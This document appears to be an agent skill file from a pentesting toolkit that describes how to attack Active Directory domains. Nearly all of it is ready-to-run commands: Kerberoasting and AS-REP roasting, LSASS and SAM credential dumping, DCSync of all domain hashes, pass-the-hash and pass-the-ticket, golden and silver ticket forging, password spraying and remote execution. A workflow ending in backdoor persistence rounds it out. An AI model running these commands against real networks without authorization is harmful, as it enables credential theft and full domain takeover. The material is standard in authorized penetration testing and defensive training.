---
name: attacking-active-directory
description: Attack and enumerate Active Directory environments using Kerberos attacks (Kerberoasting, ASREPRoasting), credential dumping (DCSync, Mimikatz), lateral movement (PtH, PtT), and BloodHound analysis. Use when pentesting Windows domains or exploiting AD misconfigurations.
---

# Attacking Active Directory

## When to Use

- AD reconnaissance and enumeration
- Kerberos-based attacks
- Credential dumping from domain controllers
- Lateral movement within domains
- BloodHound attack path analysis
- Domain persistence techniques

## When NOT to Use

- **Non-Windows / Linux-only environments** — use `enumerating-network-services`
- **Cracking the hashes you collected** — use `cracking-passwords`
- **Post-domain-compromise persistence** — use `establishing-persistence`
- **Entra ID / Azure AD as the primary target** — use `attacking-entra-id`
- **Detecting these attacks defensively** — use `engineering-detections`

## Route to a Depth Skill

Several AD escalation families are deep enough to have their own procedure
skill. When enumeration points at one of these, switch to it — the general
methodology here does not carry the tool-specific detail they do.

| Signal | Skill |
| --- | --- |
| A CA exists (`pKIEnrollmentService`), `certipy find` flags a template, ESC1-ESC16 | `abusing-adcs` |
| BloodHound flags Unconstrained/Constrained/RBCD delegation, `GenericWrite` over a computer | `attacking-kerberos-delegation` |
| The target is Entra ID / Azure AD, tokens, PRTs, or hybrid-identity sync | `attacking-entra-id` |

The domain methodology below (Kerberoasting, DCSync, lateral movement) still
applies; these skills specialize a single step of it and hand back here.

## Kerberoasting

**Windows:**
```powershell
# Check kerberoastable users
.\Rubeus.exe kerberoast /stats

# Roast all
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt

# Target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

**Linux:**
```bash
# Impacket GetUserSPNs
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt

# With NT hash
GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :ntlmhash domain.local/user -outputfile hashes.txt

# Target specific user
GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password
```

**Crack Hashes:**
```bash
# Hashcat (TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt

# John
john --wordlist=wordlist.txt hashes.txt
```

## ASREPRoasting

**Windows:**
```powershell
# Enumerate vulnerable users
Get-DomainUser -PreauthNotRequired

# Roast
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
.\Rubeus.exe asreproast /user:victim /format:hashcat
```

**Linux:**
```bash
# With domain creds
GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.txt

# Without creds (username list)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10
```

**Crack AS-REP:**
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

## BloodHound

**Data Collection:**
```powershell
# Windows - SharpHound
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup
```

**Linux:**
```bash
# bloodhound-python
bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip
```

**Useful Queries:**
```cypher
# Shortest path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

# AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# DCSync rights
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
```

## Credential Dumping

**LSASS Dumping:**
```powershell
# Task Manager: Right-click lsass.exe -> Create dump file

# procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parse offline with mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**SAM Dumping:**
```cmd
# Save hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Extract hashes (Linux)
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**DCSync (Domain):**
```bash
# secretsdump - dump all
secretsdump.py domain.local/user:password@dc.domain.local -just-dc

# Specific user
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt

# With NTLM hash
secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc
```

## Pass-the-Hash

**Windows:**
```powershell
# Mimikatz
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe
```

**Linux:**
```bash
# CrackMapExec
nxc smb 10.10.10.10 -u administrator -H hash
nxc smb 10.10.10.10 -u administrator -H hash -x whoami

# psexec
psexec.py -hashes :hash administrator@10.10.10.10

# wmiexec
wmiexec.py -hashes :hash administrator@10.10.10.10

# evil-winrm
evil-winrm -i 10.10.10.10 -u administrator -H hash
```

## Pass-the-Ticket

**Export Tickets:**
```powershell
# Mimikatz
sekurlsa::tickets /export

# Rubeus
.\Rubeus.exe dump /nowrap
.\Rubeus.exe monitor /interval:10
```

**Import/Use Tickets:**
```powershell
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:base64ticket

# Verify
klist
```

**Linux PtT:**
```bash
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Set ticket
export KRB5CCNAME=ticket.ccache

# Use ticket
psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

## Overpass-the-Hash

```powershell
# Rubeus - request TGT with NTLM hash
.\Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:hash /ptt

# With AES key (better OPSEC)
.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt
```

## Golden/Silver Tickets

**Golden Ticket (TGT):**
```powershell
# Requirements: krbtgt hash, Domain SID

# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Rubeus
.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt
```

**Silver Ticket (TGS):**
```powershell
# Requirements: Service account hash, Service SPN

# Mimikatz - CIFS service
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt
```

## Lateral Movement

**CrackMapExec:**
```bash
# SMB spray
nxc smb 10.10.10.0/24 -u user -p password

# Execute commands
nxc smb 10.10.10.10 -u admin -p password -x whoami
nxc smb 10.10.10.10 -u admin -H hash -x whoami

# Dump SAM
nxc smb 10.10.10.10 -u admin -p password --sam

# Dump LSA
nxc smb 10.10.10.10 -u admin -p password --lsa
```

**PSExec Variants:**
```bash
# psexec
psexec.py domain/user:password@10.10.10.10

# wmiexec (stealthier)
wmiexec.py domain/user:password@10.10.10.10

# smbexec (no service)
smbexec.py domain/user:password@10.10.10.10
```

**WinRM:**
```powershell
# PowerShell
Enter-PSSession -ComputerName dc.domain.local -Credential domain\user
```

```bash
# evil-winrm
evil-winrm -i 10.10.10.10 -u administrator -p password
evil-winrm -i 10.10.10.10 -u administrator -H hash
```

## Enumeration

**Domain Info:**
```powershell
# PowerView
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
```

**Linux Enumeration:**
```bash
# crackmapexec
nxc smb 10.10.10.0/24 -u user -p password --users
nxc smb 10.10.10.0/24 -u user -p password --groups

# ldapsearch
ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"
```

## Quick Workflow

1. **Initial Access** → Get domain credentials
2. **Enumeration** → Run BloodHound collection
3. **Kerberoasting** → Extract and crack service tickets
4. **Lateral Movement** → Use creds to move to high-value targets
5. **Credential Dumping** → Dump LSASS/SAM on compromised hosts
6. **DCSync** → Extract all domain hashes from DC
7. **Persistence** → Golden ticket or create backdoor accounts

## Common Wins

- Kerberoasting weak service account passwords
- ASREPRoasting accounts without preauth
- BloodHound finding short paths to DA
- Pass-the-Hash from dumped credentials
- DCSync with compromised accounts that have replication rights

## Tools

- **Rubeus** - Kerberos attacks (Windows)
- **Mimikatz** - Credential dumping (Windows)
- **Impacket** - Comprehensive toolkit (Linux)
- **BloodHound** - AD relationship graphing
- **CrackMapExec** - Swiss army knife for AD
- **PowerView** - AD enumeration (PowerShell)
- **evil-winrm** - WinRM access (Linux)

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Initial Access** (TA0001)

- [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts _(also Persistence, Privilege Escalation, Defense Evasion)_ — see also `cracking-passwords`, `exploiting-cloud-platforms`

**Execution** (TA0002)

- [T1047](https://attack.mitre.org/techniques/T1047/) Windows Management Instrumentation — see also `escalating-windows-privileges`
- [T1569](https://attack.mitre.org/techniques/T1569/) System Services — see also `escalating-windows-privileges`

**Persistence** (TA0003)

- [T1098](https://attack.mitre.org/techniques/T1098/) Account Manipulation _(also Privilege Escalation)_ — see also `establishing-persistence`
- [T1136](https://attack.mitre.org/techniques/T1136/) Create Account — see also `establishing-persistence`
- [T1556](https://attack.mitre.org/techniques/T1556/) Modify Authentication Process _(also Credential Access)_ — see also `establishing-persistence`

**Privilege Escalation** (TA0004)

- [T1484](https://attack.mitre.org/techniques/T1484/) Domain or Tenant Policy Modification _(also Defense Evasion)_

**Credential Access** (TA0006)

- [T1003](https://attack.mitre.org/techniques/T1003/) OS Credential Dumping — see also `cracking-passwords`
- [T1003.001](https://attack.mitre.org/techniques/T1003/001/) LSASS Memory — see also `engineering-detections`
- [T1003.003](https://attack.mitre.org/techniques/T1003/003/) NTDS
- [T1003.006](https://attack.mitre.org/techniques/T1003/006/) DCSync
- [T1110.003](https://attack.mitre.org/techniques/T1110/003/) Password Spraying — see also `cracking-passwords`
- [T1557](https://attack.mitre.org/techniques/T1557/) Adversary-in-the-Middle _(also Collection)_ — see also `attacking-wireless-networks`
- [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets — see also `attacking-kerberos-delegation`
- [T1558.003](https://attack.mitre.org/techniques/T1558/003/) Kerberoasting — see also `cracking-passwords`
- [T1558.004](https://attack.mitre.org/techniques/T1558/004/) AS-REP Roasting
- [T1649](https://attack.mitre.org/techniques/T1649/) Steal or Forge Authentication Certificates — see also `abusing-adcs`

**Discovery** (TA0007)

- [T1018](https://attack.mitre.org/techniques/T1018/) Remote System Discovery — see also `enumerating-network-services`
- [T1069](https://attack.mitre.org/techniques/T1069/) Permission Groups Discovery — see also `exploiting-cloud-platforms`
- [T1087](https://attack.mitre.org/techniques/T1087/) Account Discovery — see also `exploiting-cloud-platforms`

**Lateral Movement** (TA0008)

- [T1021](https://attack.mitre.org/techniques/T1021/) Remote Services — see also `enumerating-network-services`
- [T1021.001](https://attack.mitre.org/techniques/T1021/001/) Remote Desktop Protocol
- [T1021.002](https://attack.mitre.org/techniques/T1021/002/) SMB/Windows Admin Shares — see also `enumerating-network-services`
- [T1021.006](https://attack.mitre.org/techniques/T1021/006/) Windows Remote Management
- [T1550](https://attack.mitre.org/techniques/T1550/) Use Alternate Authentication Material _(also Defense Evasion)_
- [T1550.002](https://attack.mitre.org/techniques/T1550/002/) Pass the Hash — see also `cracking-passwords`
- [T1550.003](https://attack.mitre.org/techniques/T1550/003/) Pass the Ticket

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/fortra/impacket
- https://github.com/GhostPack/Rubeus
- https://github.com/BloodHoundAD/BloodHound
